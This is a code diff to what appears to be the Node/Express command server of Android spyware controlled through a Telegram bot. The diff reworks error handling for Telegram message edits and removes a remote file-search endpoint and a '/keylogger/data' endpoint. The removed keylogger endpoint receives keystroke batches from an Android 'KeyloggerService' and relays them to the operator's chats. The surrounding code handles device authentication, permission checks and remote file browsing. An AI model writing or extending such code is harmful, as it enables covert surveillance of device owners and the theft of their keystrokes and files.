@@ -2055,33 +2055,27 @@ app.post("/json/permissions", express.json(), async (req, res) => {
     
     message += `_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
     
-    // Skip Telegram edit if no UI context (e.g., background periodic check)
-    if (!chat_id || !msg_id || chat_id === 0 || msg_id === 0) {
-      // Let the endpoint return ok without editing message
-    } else {
-      try {
-        await bot.editMessageText(message, {
-          chat_id,
-          message_id: msg_id,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [{text: "🔄 Refresh Status", callback_data: "check_permissions"}],
-              [{text: "🔙 Back to Menu", callback_data: "permissions_menu"}]
-            ]
-          }
-        });
-      } catch (editError) {
-        // Handle common Telegram edit errors gracefully
-        const desc = editError?.description || "";
-        if (desc.includes("message is not modified")) {
-          console.log("Message content unchanged - normal for refresh");
-        } else if (desc.includes("chat not found")) {
-          console.log("Skipping edit - chat not found (likely expired UI context)");
-        } else {
-          console.error("Error editing message:", editError);
-          throw editError; // Re-throw other errors
-        }
+    try {
+    await bot.editMessageText(message, {
+      chat_id,
+      message_id: msg_id,
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{text: "🔄 Refresh Status", callback_data: "check_permissions"}],
+          [{text: "🔙 Back to Menu", callback_data: "permissions_menu"}]
+        ]
+      }
+    });
+    } catch (editError) {
+      // Handle "message is not modified" error gracefully
+      if (editError.description && editError.description.includes("message is not modified")) {
+        console.log("Message content unchanged - this is normal for refresh");
+        // Don't throw error, just log it
+        return;
+      } else {
+        console.error("Error editing message:", editError);
+        throw editError; // Re-throw other errors
       }
     }
     
@@ -3059,114 +3053,6 @@ app.post("/json/enhanced_perfection", express.json(), async (req, res) => {
     
     res.json({ ok: true });
   } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
-});
-// Global Telegram edit wrapper to prevent 400 errors (chat not found / message not modified)
-(() => {
-  const originalEditMessageText = bot.editMessageText.bind(bot);
-  bot.editMessageText = async (text, opts = {}) => {
-    try {
-      const chatId = opts?.chat_id;
-      const msgId = opts?.message_id;
-      if (!chatId || !msgId || chatId === 0 || msgId === 0) {
-        console.log("safeEditMessageText: skipped edit (invalid chat_id/message_id)");
-        return { ok: false, skipped: true };
-      }
-      return await originalEditMessageText(text, opts);
-    } catch (e) {
-      const desc = e?.description || "";
-      if (desc.includes("message is not modified")) {
-        console.log("safeEditMessageText: message not modified (ignored)");
-        return { ok: false, ignored: true };
-      }
-      if (desc.includes("chat not found")) {
-        console.log("safeEditMessageText: chat not found (ignored)");
-        return { ok: false, ignored: true };
-      }
-      throw e;
-    }
-  };
-})();
-
-// File search endpoint to match Android FilesService searchFiles()
-app.post("/json/file_search", express.json(), async (req, res) => {
-  try {
-    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
-    if (!deviceInfo) return res.sendStatus(403);
-
-    const { chat_id, msg_id, query, results = [] } = req.body || {};
-    if (!chat_id || !msg_id) {
-      return res.json({ ok: true, skipped: true });
-    }
-
-    // Build keyboard similar to directory list
-    const rows = results.map(item => {
-      const text = `${item.icon || "📄"} ${item.name}${item.size ? ' (' + item.size + ')' : ''}`;
-      return [{
-        text: text.slice(0, 60),
-        callback_data: item.dir ? `file_${item.path}` : `fileget_${item.path}`
-      }];
-    });
-
-    // Controls row
-    rows.push([
-      { text: "🔍 New Search", callback_data: "file_search_prompt" },
-      { text: "📂 Root", callback_data: "file_root" }
-    ]);
-    rows.push([{ text: "🔙 Back", callback_data: "file_menu" }]);
-
-    const count = results.length;
-    await bot.editMessageText(
-      `*🔍 Search Results*\n\nQuery: "${query || ''}"\nResults: ${count}\n\n_Tap to open files/folders_`,
-      {
-        chat_id,
-        message_id: msg_id,
-        parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: rows }
-      }
-    );
-
-    res.json({ ok: true });
-  } catch (error) {
-    console.error("File search error:", error);
-    res.status(500).json({ error: error.message });
-  }
-});
-
-// Keylogger data endpoint to receive batches from Android KeyloggerService
-app.post("/keylogger/data", express.json(), async (req, res) => {
-  try {
-    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
-    if (!deviceInfo) return res.sendStatus(403);
-
-    const { type, device_id, timestamp, data = [] } = req.body || {};
-    const sessions = getActiveSessions(deviceInfo.key);
-
-    const header = `*⌨️ Keylogger Batch*\n\nEntries: ${data.length}\nDevice: \`${(device_id || deviceInfo.deviceId).slice(0,6)}\`\nTime: ${new Date(timestamp || Date.now()).toLocaleString()}\n`;
-
-    for (const { chatId } of sessions) {
-      try {
-        let message = header;
-        const sample = Math.min(10, data.length);
-        if (sample > 0) {
-          message += `\n*Sample (${sample}/${data.length}):*\n`;
-          for (let i = 0; i < sample; i++) {
-            const entry = data[i] || {};
-            const t = new Date(entry.timestamp || Date.now()).toLocaleTimeString();
-            const app = entry.app || entry.package || "unknown.app";
-            message += `• [${entry.type || "event"}] ${app} @ \`${t}\`\n`;
-          }
-        }
-        await sendSuccess(chatId, message);
-      } catch (e) {
-        console.error("Keylogger send error:", e.message);
-      }
-    }
-
-    res.json({ ok: true });
-  } catch (error) {
-    console.error("Keylogger endpoint error:", error);
     res.status(500).json({ error: error.message });
   }
 });
